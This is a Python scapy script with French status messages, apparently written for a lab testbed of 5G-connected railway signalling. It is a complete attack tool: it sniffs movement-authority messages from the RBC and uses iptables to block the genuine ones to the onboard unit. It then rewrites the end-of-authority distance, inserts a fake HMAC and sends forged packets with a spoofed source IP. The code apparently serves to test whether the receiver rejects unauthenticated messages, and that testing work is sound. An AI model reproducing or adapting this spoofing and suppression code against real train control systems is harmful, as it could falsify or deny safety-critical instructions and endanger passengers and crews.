import json
import os
import signal
import sys
from scapy.all import sniff, UDP, IP, Raw, send

IFACE = "vetha70195e"
RBC_IP = "192.168.70.129"
EVC_TUN_IP = "12.1.1.130"
EVC_PORT = 5001
blocked = False

def cleanup(sig, frame):
    print("\n[ATTACK SPOOFING] Restauration des règles iptables...")
    os.system("iptables -D OUTPUT -p udp --dport 5001 -j DROP 2>/dev/null")
    print("[ATTACK SPOOFING] Règles iptables restaurées — attaque terminée")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

print("[ATTACK SPOOFING] En écoute sur l'interface vetha70195e...")
print("[ATTACK SPOOFING] Attente d'une MA pour la falsifier...")

def process_packet(pkt):
    global blocked
    if not (pkt.haslayer(UDP) and pkt.haslayer(Raw)):
        return
    try:
        data = pkt[Raw].load.decode()
        msg = json.loads(data)
        if msg.get("type") == "3" and msg.get("priority") != "high":
            original_eoa = msg.get("eoa")
            print(f"[ATTACK SPOOFING] MA interceptée — EOA originale: {original_eoa}m")
            if not blocked:
                os.system("iptables -A OUTPUT -p udp --dport 5001 -j DROP")
                print("[ATTACK SPOOFING] Vraies MA bloquées avec iptables")
                blocked = True
            msg["eoa"] = 100
            msg["hmac"] = "hmac_falsifie_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            print(f"[ATTACK SPOOFING] MA falsifiée — EOA modifiée: 100m (HMAC invalide)")
            # Forge le paquet avec IP source = RBC et IP dest = tunnel 5G
            payload = json.dumps(msg).encode()
            packet = IP(src=RBC_IP, dst=EVC_TUN_IP) / UDP(sport=5000, dport=EVC_PORT) / Raw(load=payload)
            send(packet, verbose=0)
            print(f"[ATTACK SPOOFING] MA falsifiée envoyée via paquet forgé vers {EVC_TUN_IP}:{EVC_PORT}")
            print(f"[ATTACK SPOOFING] L'EVC va détecter le HMAC invalide et rejeter le message ✅")
    except Exception as e:
        pass

sniff(iface=IFACE, filter="udp port 5000", prn=process_packet, store=0)
